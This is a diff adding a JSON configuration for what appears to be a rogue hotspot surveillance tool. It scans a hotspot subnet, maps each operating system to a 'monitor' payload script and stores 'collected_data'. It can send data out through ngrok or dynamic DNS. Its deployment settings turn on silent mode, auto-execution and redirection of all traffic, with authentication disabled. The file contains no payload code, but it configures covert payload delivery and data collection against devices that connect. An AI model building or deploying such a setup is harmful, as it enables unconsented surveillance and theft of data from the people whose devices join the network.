@@ -1,0 +1,42 @@
+{
+  "server": {
+    "host": "0.0.0.0",
+    "port": 8080,
+    "data_port": 8081
+  },
+  "network": {
+    "interface": "wlan0",
+    "scan_interval": 5,
+    "hotspot_range": "192.168.43.0/24"
+  },
+  "payloads": {
+    "windows": "payloads/windows_monitor.ps1",
+    "linux": "payloads/linux_monitor.py",
+    "mac": "payloads/linux_monitor.py",
+    "android": "payloads/android_monitor.py"
+  },
+  "data": {
+    "storage_path": "collected_data",
+    "log_format": "json",
+    "max_file_size": "10MB"
+  },
+  "remote": {
+    "data_url": "auto",
+    "backup_urls": [],
+    "update_interval": 300,
+    "use_ngrok": false,
+    "ngrok_token": "",
+    "dynamic_dns": ""
+  },
+  "deployment": {
+    "silent_mode": true,
+    "auto_execute": true,
+    "hide_interface": false,
+    "redirect_all_traffic": true
+  },
+  "security": {
+    "enable_auth": false,
+    "api_key": "your_api_key_here",
+    "allowed_devices": []
+  }
+}
